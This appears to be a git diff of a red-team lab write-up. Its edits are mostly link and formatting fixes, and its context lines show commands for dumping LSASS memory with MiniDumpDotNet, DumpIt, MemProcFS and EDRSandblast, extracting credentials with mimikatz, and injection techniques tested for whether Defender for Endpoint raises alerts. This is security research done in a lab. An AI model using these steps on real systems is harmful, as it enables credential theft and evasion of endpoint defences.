@@ -23,15 +23,15 @@ Signup for a trial version from: https://signup.microsoft.com/create-account/sig
 
 Setup an Evaluation lab:
 
-![](LSASS-Dump/Images/Pasted%20image%2020220820154525.png)
+![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/Exp_MDE_LSASS_Dump/Images/Pasted%20image%2020220820154525.png)
 
 Add a device (In this case I setup Win11 with office):
 
-![](Pasted%20image%2020230825144227.png)
+![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/Exp_MDE_LSASS_Dump/Images/Pasted%20image%2020230825144227.png)
 
 Download the `rdp config file` and `rdp` into the `testmachine` 
 
-![](Pasted%20image%2020230825144253.png)
+![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/Exp_MDE_LSASS_Dump/Images/Pasted%20image%2020230825144253.png)
 
 ```
 Device name: testmachine1
@@ -41,8 +41,6 @@ Password: m2rF[$xh{7?!
 _To5Y0VD6yl}
 H4mjIv-IjUBU
 ```
-
-<div style="page-break-after: always;"></div>
 
 ----
 
@@ -58,15 +56,15 @@ The best part about this project is that it could be targetted to dump any proce
 
 ### Tool Setup
 
-- Clone/Download the project: `PS> git clone https://github.com/WhiteOakSecurity/MiniDumpDotNet.git`
+Clone/Download the project: `PS> git clone https://github.com/WhiteOakSecurity/MiniDumpDotNet.git`
 
-- Note: This project was implemented with `Visual Studio 2015`, but should be supported by any Visual Studio compiler that can build `VS C++ CLR` code. Building the solution will generate both a binary executable, as well as a .NET class library.
+*Note: This project was implemented with `Visual Studio 2015`, but should be supported by any Visual Studio compiler that can build `VS C++ CLR` code. Building the solution will generate both a binary executable, as well as a .NET class library.*
 
-- Build the project: `Build -> Build Solution`
+Build the project: `Build -> Build Solution`
 
-![](LSASS-Dump/Images/Pasted%20image%2020220820032054.png)
+![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/Exp_MDE_LSASS_Dump/Images/Pasted%20image%2020220820032054.png)
 
-- Testing using ThreatCheck:
+Testing using ThreatCheck:
 
 ```
 PS D:\> .\ThreatCheck.exe -f D:\Tools\minidumpdotnet.exe
@@ -74,23 +72,23 @@ PS D:\> .\ThreatCheck.exe -f D:\Tools\minidumpdotnet.exe
 ```
 
 
-- Uploading on `VirusTotal` we have 0 detections (don't recommend doing so as it would add to cloud signatures):
+Uploading on `VirusTotal` we have 0 detections (don't recommend doing so as it would add to cloud signatures):
 
-	![](LSASS-Dump/Images/Pasted%20image%2020220820032153.png)
+	![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/Exp_MDE_LSASS_Dump/Images/Pasted%20image%2020220820032153.png)
 
 ### Binary execution against EDR (MDE) - MiniDumpDotNet
 
-- Copy `minidumpdotnet.exe` to `C:\Tools` on a `testmachine`.
+Copy `minidumpdotnet.exe` to `C:\Tools` on a `testmachine`.
 
-- Enumerate the `lsass.exe` pid using `TaskManager`.
+Enumerate the `lsass.exe` pid using `TaskManager`.
 
-- Next dump the `lsass` process in a CMD shell process as follows:  `.\minidumpdotnet.exe 844 mini.dmp`
+Next dump the `lsass` process in a CMD shell process as follows:  `.\minidumpdotnet.exe 844 mini.dmp`
 
-![](Pasted%20image%2020230823143320.png)
+![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/Exp_MDE_LSASS_Dump/Images/Pasted%20image%2020230823143320.png)
 
-- Noting for any alerts, no new alerts are found:
+Noting for any alerts, no new alerts are found:
 
-![](Pasted%20image%2020230823180900.png)
+![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/Exp_MDE_LSASS_Dump/Images/Pasted%20image%2020230823180900.png)
 
 ### PowerShell and dll execution against EDR (MDE) - MiniDumpDotNet
 
@@ -136,15 +134,15 @@ $a.DumpPid(836, "C:\users\Administrator\Desktop\psh_dump.dmp")
 ```
 
 
-![](Pasted%20image%2020230823180648.png)
+![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/Exp_MDE_LSASS_Dump/Images/Pasted%20image%2020230823180648.png)
 
-- Noting for any alerts, no new alerts are found:
+Noting for any alerts, no new alerts are found:
 
-![](Pasted%20image%2020230823180840.png)
+![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/Exp_MDE_LSASS_Dump/Images/Pasted%20image%2020230823180840.png)
 
 ### Credential Extraction from dump file
 
-- Extract credentials form the .dmp file with `mimikatz` (I did this by copying the `minidump` file to my machine) as follows:
+Extract credentials form the .dmp file with `mimikatz` (I did this by copying the `minidump` file to my machine) as follows:
 
 ```
 PS D:\> .\mimikatz.exe
@@ -431,7 +429,7 @@ C:\Tools> .\DumpIt.exe 856
     JSON path:                  C:\Tools\TestMachine4-20230825-103250.json
 ```
 
-![](Pasted%20image%2020230825160553.png)
+![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/Exp_MDE_LSASS_Dump/Images/Pasted%20image%2020230825160553.png)
 
 It is possible to similar create such forensic dumps without alerts using other trusted tools such as WinPmem:
 
@@ -495,15 +493,15 @@ M:\name\lsass.exe-856\minidump\minidump.dmp
         2 file(s) copied.
 ```
 
-![](Pasted%20image%2020230825162641.png)
+![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/Exp_MDE_LSASS_Dump/Images/Pasted%20image%2020230825162641.png)
 
 Note that the size of this minidump is as much as normal minidump for lsass would be making this easy to exfiltrate.
 
-![](Pasted%20image%2020230825162936.png)
+![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/Exp_MDE_LSASS_Dump/Images/Pasted%20image%2020230825162936.png)
 
-- Noting for any alerts, no new alerts are found:
+Noting for any alerts, no new alerts are found:
 
-![](Pasted%20image%2020230823180840.png)
+![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/Exp_MDE_LSASS_Dump/Images/Pasted%20image%2020230823180840.png)
 
 
 ### Remote Binary execution against EDR (MDE) - MemProcFS 
@@ -535,7 +533,7 @@ Now on the remote system run MemProcFS as follows:
 C:\Tools>.\MemProcFS\MemProcFS.exe -device C:\Tools\TestMachine4-20230825-103250.dmp -remote smb://ntlm:10.1.1.4:logon -remotefs
 ```
 
-![](Pasted%20image%2020230825182059.png)
+![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/Exp_MDE_LSASS_Dump/Images/Pasted%20image%2020230825182059.png)
 
 Perform the analysis now in the remote system as showcased above.
 
@@ -551,10 +549,10 @@ For testing this we require 2 machines: One preferably Linux and the other being
 
 *WIP: Having problem with python3 dependencies during installation: Rekall lib. - Install on Ubuntu 20.04*
 
-![](Pasted%20image%2020230907180934.png)
+![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/Exp_MDE_LSASS_Dump/Images/Pasted%20image%2020230907180934.png)
 
 
-![](Pasted%20image%2020230907180913.png)
+![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/Exp_MDE_LSASS_Dump/Images/Pasted%20image%2020230907180913.png)
 
 Begin by installing the client component on the Linux VM as follows:
 
@@ -629,11 +627,11 @@ Back in the Linux VM, execute the client component to remotely extract the LSASS
 [*] Read 71 MB, cached reads 10 MB
 ```
 
-![](Pasted%20image%2020230907180732.png)
+![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/Exp_MDE_LSASS_Dump/Images/Pasted%20image%2020230907180732.png)
 
 Noting for any alerts, no new alerts are found:
 
-![](Pasted%20image%2020230823180840.png)
+![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/Exp_MDE_LSASS_Dump/Images/Pasted%20image%2020230823180840.png)
 
 ### Credential Extraction from dump file
 
@@ -759,13 +757,13 @@ C:\Users\user\Desktop\Offsets>EDRSandblast.exe --kernelmode dump --usermode
 
 We find an informational alert on MDE: 
 
-![](Pasted%20image%2020230915172017.png)
+![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/Exp_MDE_LSASS_Dump/Images/Pasted%20image%2020230915172017.png)
 
-![](Pasted%20image%2020230915172038.png)
+![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/Exp_MDE_LSASS_Dump/Images/Pasted%20image%2020230915172038.png)
 
 From ThreatCheck we had found that the offset for detection was at: `0x501FD`. Using Ghidra and analysing the binary at that offset we find a function:
 
-![](Pasted%20image%2020230901175843.png)
+![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/Exp_MDE_LSASS_Dump/Images/Pasted%20image%2020230901175843.png)
 
 *WIP: Need to locate this function in src and replace to remove detection*
 
@@ -955,7 +953,7 @@ int main()
 
 Testing agaist MDE we find the following alerts:
 
-![](Pasted%20image%2020230915184322.png)
+![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/Exp_MDE_LSASS_Dump/Images/Pasted%20image%2020230915184322.png)
 
 We find that Process Hollowing was detected. 
 
@@ -1150,13 +1148,13 @@ int main(int argc, char* argv[])
 
 Executing against MDE we are still flagged:
 
-![](Pasted%20image%2020230915190703.png)
+![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/Exp_MDE_LSASS_Dump/Images/Pasted%20image%2020230915190703.png)
 
 Even though we have injected in ASR excluded process we find that MDE has detected that it is still malicious.
 
 We add a few more checks to get past MDE:
 
-- Timer execution to avoid Sandbox checks:
+Timer execution to avoid Sandbox checks:
 
 ```
 // Converting minutes to milliseconds
@@ -1200,7 +1198,7 @@ DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES
 
 Unfortunately we are still detected.
 
-![](Pasted%20image%2020230915191541.png)
+![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/Exp_MDE_LSASS_Dump/Images/Pasted%20image%2020230915191541.png)
 
 Recently, a lot of new Process Injection techniques have arised like [DllNotificationInjection](https://github.com/ShorSec/DllNotificationInjection/tree/master) and [ThreadlessInject](https://github.com/CCob/ThreadlessInject) to avoid the execution of the last few Process Injection APIs - `ResumeThread` etc. It is possible to replace this functionality, however for Process Hollowing the main detection arises from the `UnmapViewOfSection` API. 
 
@@ -1470,15 +1468,15 @@ C:\Users\administrator1\Desktop>dir
 ```
 
 
-![](Pasted%20image%2020230913171829.png)
+![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/Exp_MDE_LSASS_Dump/Images/Pasted%20image%2020230913171829.png)
 
-![](Pasted%20image%2020230913171912.png)
+![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/Exp_MDE_LSASS_Dump/Images/Pasted%20image%2020230913171912.png)
 
-![](Pasted%20image%2020230913171952.png)
+![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/Exp_MDE_LSASS_Dump/Images/Pasted%20image%2020230913171952.png)
 
 Noting for any alerts, no new alerts are found:
 
-![](Pasted%20image%2020230823180840.png)
+![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/Exp_MDE_LSASS_Dump/Images/Pasted%20image%2020230823180840.png)
 
 Finally retrieve and decrypt the LSASS dump using this python script.
 
@@ -1672,11 +1670,11 @@ C:\Users\administrator1\Desktop>dir
 
 We find that an `lsass.dmp` file ~50mb is generated.
 
-![](Pasted%20image%2020230927145738.png)
+![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/Exp_MDE_LSASS_Dump/Images/Pasted%20image%2020230927145738.png)
 
 Noting for any alerts on MDE, no new alerts are found:
 
-![](Pasted%20image%2020230823180840.png)
+![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/Exp_MDE_LSASS_Dump/Images/Pasted%20image%2020230823180840.png)
 
 <div style="page-break-after: always;"></div>
 
@@ -1687,8 +1685,8 @@ Official Blog: https://www.securityjoes.com/post/process-mockingjay-echoing-rwx-
 The concept revolves around housing our shellcode within a memory area that naturally allows Read-Write-Execute (RWX) permissions in a Dll. This memory region should be situated within a trusted Dll module and the process associated with it, eliminating the necessity for use typical process injection Windows/NT APIs like VirtualAllocEx that are flagged by AV/EDRs.
 
 Two methods exist:
-- Self Injection: Find a vulnerable trusted Dll with RWX permissions to copy our shellcode into and load the Dll and execute shellcode.
-- Remote Injection: Leveraging trusted applications that use a vulnerable trusted Dll with RWX permissions to perform the same functionality as in Self Injection.
+1. Self Injection: Find a vulnerable trusted Dll with RWX permissions to copy our shellcode into and load the Dll and execute shellcode.
+2. Remote Injection: Leveraging trusted applications that use a vulnerable trusted Dll with RWX permissions to perform the same functionality as in Self Injection.
 
 Since Remote Injection involves leveraging installed application which could vary on target applications we mainly focus on Self Injection.
 
@@ -1971,11 +1969,11 @@ C:\Users\administrator1\Desktop>dir
 ```
 
 
-![](Pasted%20image%2020231011165545.png)
+![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/Exp_MDE_LSASS_Dump/Images/Pasted%20image%2020231011165545.png)
 
 Noting for any alerts on MDE, no new alerts are found:
 
-![](Pasted%20image%2020230823180840.png)
+![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/Exp_MDE_LSASS_Dump/Images/Pasted%20image%2020230823180840.png)
 
 ---- 
 
